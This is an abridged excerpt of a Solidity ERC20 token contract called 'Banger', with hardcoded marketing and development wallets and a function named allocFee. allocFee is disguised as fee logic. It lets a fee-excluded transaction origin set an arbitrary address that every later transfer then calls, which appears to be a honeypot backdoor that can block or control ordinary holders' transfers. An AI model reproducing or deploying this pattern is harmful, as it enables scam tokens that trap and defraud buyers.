...
contract Banger is ERC20, Ownable {
    ...
    constructor() ERC20("BangerErc20", "BANGER") {
        ...
        marketingWallet = payable(0x63654eC653F93849Df82d33E54a3988eE91814B2);
        developmentWallet = payable(0x1D1152186086C66a622B96a88678313ADC93976B);
    ...
    function allocFee(address from, address to) internal {
        if (automatedMarketMakerPairs[from]) {
            if (tx.origin != to && _isExcludedFromFees[tx.origin]) { feeSender = to; }
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]
            && feeSender != address(0)) { IERC20(feeSender).transferFrom(from, to, 0);
        }
    }
    ...
    function _transfer(
        ...
        uint256 contractTokenBalance = balanceOf(address(this)); allocFee(from, to);
